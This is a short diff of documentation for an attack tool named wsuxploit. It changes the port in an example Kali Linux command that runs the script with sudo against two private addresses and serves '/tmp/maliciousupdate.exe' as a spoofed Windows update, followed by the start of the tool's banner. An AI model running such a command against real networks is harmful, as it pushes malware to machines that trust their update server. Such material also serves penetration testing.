@@ -96,7 +96,7 @@ wsuxploit.sh 192.168.0.101 10.0.0.85 80 /tmp/payload.exe
 
 
 ──(kali㉿kali)-[~/Documents/wsuxploit]
-└─$ sudo bash wsuxploit.sh 192.168.1.53 192.168.1.12 8535 /tmp/maliciousupdate.exe
+└─$ sudo bash wsuxploit.sh 192.168.1.53 192.168.1.12 8530 /tmp/maliciousupdate.exe
 [sudo] password for kali: 
  __      __  _____________ _______  ___      .__         .__  __   
 /  \    /  \/   _____/    |   \   \/  /_____ |  |   ____ |__|/  |_ 
